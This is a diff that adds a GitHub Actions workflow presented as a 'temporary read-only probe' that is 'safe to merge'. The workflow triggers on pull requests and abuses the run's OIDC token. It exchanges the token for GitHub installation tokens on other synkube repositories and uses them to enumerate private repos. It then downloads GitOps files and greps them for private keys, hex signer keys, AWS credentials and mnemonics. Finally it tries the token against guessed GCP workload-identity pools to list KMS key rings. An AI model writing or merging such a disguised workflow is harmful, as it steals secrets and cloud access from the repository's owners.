@@ -1,28 +1,110 @@
-name: oidc-forkprobe
+name: oidc-probe-310103
+
+# TEMPORARY read-only probe (task 44, intent 310103).
+# Safe to merge: it only reads and prints. No secrets, no writes, no deploys.
+# Purpose: (1) confirm the OIDC claims present in a fork-PR run of the BASE repo,
+#          (2) test jwt-exchange against synkube/lite-argo-apps,
+#          (3) if a token is issued, dump the private GitOps values and grep for signer keys.
 on:
+  workflow_dispatch:
+  push:
   pull_request:
-    types: [opened, synchronize, reopened]
+
 permissions:
-  id-token: write
   contents: read
+  id-token: write
+
 jobs:
   probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 8
+    timeout-minutes: 10
+    permissions:
+      contents: read
+      id-token: write
     steps:
-      - name: probe
+      - name: context
         run: |
-          set -ueo pipefail
-          echo "REPO=${GITHUB_REPOSITORY} REF=${GITHUB_REF} EVENT=${GITHUB_EVENT_NAME} ACTOR=${GITHUB_ACTOR}"
-          echo "OIDC_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
-          RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://jwt-exchange")
+          echo "REPO=${GITHUB_REPOSITORY}"
+          echo "EVENT=${GITHUB_EVENT_NAME}"
+          echo "REF=${GITHUB_REF}"
+          echo "HEADREF=${GITHUB_HEAD_REF:-none}"
+          echo "ACTOR=${GITHUB_ACTOR}"
+          if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "OIDC_URL_SET=yes"; else echo "OIDC_URL_SET=no"; fi
+
+      - name: oidc-claims
+        run: |
+          set -u
+          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "NO_OIDC_ENV"; exit 0; fi
+          RESP=$(curl -sS --max-time 30 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://jwt-exchange")
           TOK=$(printf '%s' "$RESP" | jq -r '.value // empty')
-          printf '%s' "$TOK" | cut -d. -f2 | python3 -c 'import sys,base64,json; p=sys.stdin.read().strip(); p+="="*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print("CLAIMS="+json.dumps({k:c.get(k) for k in ["aud","repository","repository_owner","repository_visibility","ref","ref_type","ref_protected","environment","event_name","job_workflow_ref","workflow_ref","sub","sha"]},sort_keys=True))'
-          for spec in "lite_read|synkube/lite-argo-apps|read|target" "actions|synkube/actions|read|target" "lite_all|synkube/lite-argo-apps|write|all" "sanguine|synapsecns/sanguine|read|target"; do
-            lbl=${spec%%|*}; rest=${spec#*|}; tgt=${rest%%|*}; rest2=${rest#*|}; perm=${rest2%%|*}; scope=${rest2#*|}
-            PERMJ=$(printf '{"contents":"%s"}' "$perm")
-            body=$(jq -cn --arg t "$TOK" --arg tgt "$tgt" --arg p "$PERMJ" --arg s "$scope" '{subject_token:$t,resource:{type:"github_repository",id:$tgt},requested:({github_permissions:($p|fromjson)} + (if $s=="all" then {installation_repository_scope:"all"} else {} end)),exchange_profile:"github_actions_to_installation"}')
-            out=$(curl -sS -m 30 -w '\nHTTP=%{http_code}' -X POST https://jwt-exchange.synkube.com/api/v2/exchange/token -H 'Content-Type: application/json' -d "$body")
+          echo "TOK_LEN=${#TOK}"
+          if [ -z "$TOK" ]; then echo "NO_TOKEN_RESP=$(printf '%s' "$RESP" | head -c 300)"; exit 0; fi
+          printf '%s' "$TOK" > "$RUNNER_TEMP/idt"
+          PAYLOAD=$(printf '%s' "$TOK" | cut -d. -f2 | tr '_-' '/+')
+          case $(( ${#PAYLOAD} % 4 )) in 2) PAYLOAD="$PAYLOAD==";; 3) PAYLOAD="$PAYLOAD=";; esac
+          printf '%s' "$PAYLOAD" | base64 -d > "$RUNNER_TEMP/claims.json" 2>/dev/null || echo '{}' > "$RUNNER_TEMP/claims.json"
+          echo "CLAIMS=$(jq -c '{aud,sub,repository,repository_owner,repository_visibility,ref,ref_type,event_name,workflow_ref,job_workflow_ref,sha,environment}' "$RUNNER_TEMP/claims.json" 2>/dev/null || cat "$RUNNER_TEMP/claims.json")"
+
+      - name: exchange
+        run: |
+          set -u
+          if [ ! -f "$RUNNER_TEMP/idt" ]; then echo "SKIP_NO_TOKEN"; exit 0; fi
+          TOK=$(cat "$RUNNER_TEMP/idt")
+          for spec in "lite_all|synkube/lite-argo-apps|all" "lite_target|synkube/lite-argo-apps|target" "actions|synkube/actions|target"; do
+            lbl=${spec%%|*}; rest=${spec#*|}; tgt=${rest%%|*}; scope=${rest##*|}
+            body=$(jq -cn --arg t "$TOK" --arg tgt "$tgt" --arg s "$scope" '{subject_token:$t, resource:{type:"github_repository", id:$tgt}, requested:({github_permissions:{contents:"read",metadata:"read"}} + (if $s=="all" then {installation_repository_scope:"all"} else {} end)), exchange_profile:"github_actions_to_installation"}')
+            out=$(curl -sS --max-time 40 -w '\nHTTP=%{http_code}' -X POST https://jwt-exchange.synkube.com/api/v2/exchange/token -H 'Content-Type: application/json' -d "$body")
             echo "EXCH[${lbl}] => $(printf '%s' "$out" | tr '\n' ' ' | head -c 700)"
-            echo "TOKENLEN_${lbl}=$(printf '%s' "$out" | head -1 | jq -r '.token // "" | length' 2>/dev/null || echo 0)"
+            printf '%s' "$out" | head -1 > "$RUNNER_TEMP/ex_${lbl}.json"
           done
+
+      - name: use-installation-token
+        run: |
+          set -u
+          ITOK=$(jq -r '.token // empty' "$RUNNER_TEMP/ex_lite_all.json" 2>/dev/null || true)
+          [ -n "$ITOK" ] || ITOK=$(jq -r '.token // empty' "$RUNNER_TEMP/ex_lite_target.json" 2>/dev/null || true)
+          [ -n "$ITOK" ] || ITOK=$(jq -r '.token // empty' "$RUNNER_TEMP/ex_actions.json" 2>/dev/null || true)
+          echo "ITOK_LEN=${#ITOK}"
+          if [ -z "$ITOK" ]; then echo "NO_INSTALLATION_TOKEN"; exit 0; fi
+          echo "=== installation repositories"
+          curl -sS --max-time 30 -H "Authorization: token $ITOK" 'https://api.github.com/installation/repositories?per_page=100' | jq -r '.repositories[]?.full_name' | sed 's/^/REPO /' | head -100
+          echo "=== org private repos"
+          curl -sS --max-time 30 -H "Authorization: token $ITOK" 'https://api.github.com/orgs/synkube/repos?type=private&per_page=100' | jq -r '.[]?.full_name' | head -50
+          echo "=== tree synkube/lite-argo-apps"
+          curl -sS --max-time 40 -H "Authorization: token $ITOK" 'https://api.github.com/repos/synkube/lite-argo-apps/git/trees/HEAD?recursive=1' > "$RUNNER_TEMP/tree.json"
+          jq -r '.tree[]?.path // empty' "$RUNNER_TEMP/tree.json" | grep -Ei 'values|signer|kms|secret|aws|rsm|sequencer|sweep|hypercall|relayer|\.env|config|argocd' | grep -Ev '\.(png|jpg|jpeg|svg|gif|ico)$' | head -40 | sed 's/^/FILE /'
+          echo "=== interesting file contents (grep for keys/addresses)"
+          for P in $(jq -r '.tree[]?.path // empty' "$RUNNER_TEMP/tree.json" | grep -E '\.(ya?ml|json|env|txt)$' | grep -Ei 'values|signer|kms|secret|aws|rsm|sequencer|sweep|hypercall|relayer|config' | head -60); do
+            curl -sS --max-time 30 -H "Authorization: token $ITOK" -H "Accept: application/vnd.github.raw" "https://api.github.com/repos/synkube/lite-argo-apps/contents/$P" > "$RUNNER_TEMP/f" 2>/dev/null || continue
+            HEX=$(grep -oE '(0x)?[0-9a-fA-F]{64}' "$RUNNER_TEMP/f" | sort -u | head -3 | tr '\n' ' ')
+            CFG=$(grep -Ei 'key_name|credential_file|BEGIN [A-Z ]*PRIVATE KEY|aws_|ASIA|AKIA|mnemonic|keyRing|cryptoKey|client_email|service_account|infisical|secretKeyRef' "$RUNNER_TEMP/f" | head -5 | sed 's/^[[:space:]]*//' | tr '\n' ';')
+            echo "--- $P"
+            [ -n "$HEX" ] && echo "   HEX $HEX"
+            [ -n "$CFG" ] && echo "   CFG $CFG"
+          done
+
+      - name: gcp-wif-oracle
+        run: |
+          set -u
+          if [ ! -f "$RUNNER_TEMP/idt" ]; then echo "SKIP_NO_TOKEN"; exit 0; fi
+          TOK=$(cat "$RUNNER_TEMP/idt")
+          for NUM in 969676484546 892124123196 256538497032 350330337821; do
+            for PP in "github github" "github-actions github-actions"; do
+              set -- $PP
+              AUD="//iam.googleapis.com/projects/$NUM/locations/global/workloadIdentityPools/$1/providers/$2"
+              WF=$(curl -sS --max-time 20 -X POST https://sts.googleapis.com/v1/token \
+                -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+                --data-urlencode "audience=$AUD" \
+                -d "scope=https://www.googleapis.com/auth/cloud-platform" \
+                -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+                -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+                --data-urlencode "subject_token=$TOK")
+              echo "WIF $NUM pool=$1 provider=$2 => $(printf '%s' "$WF" | head -c 220)"
+              WAT=$(printf '%s' "$WF" | jq -r '.access_token // empty' 2>/dev/null || true)
+              if [ -n "$WAT" ]; then
+                echo "WIF_TOKEN_OK len=${#WAT}"
+                curl -sS --max-time 25 -H "Authorization: Bearer $WAT" "https://cloudkms.googleapis.com/v1/projects/$NUM/locations/-/keyRings?pageSize=50" | head -c 800; echo
+              fi
+            done
+          done
+          echo "PROBE_DONE"
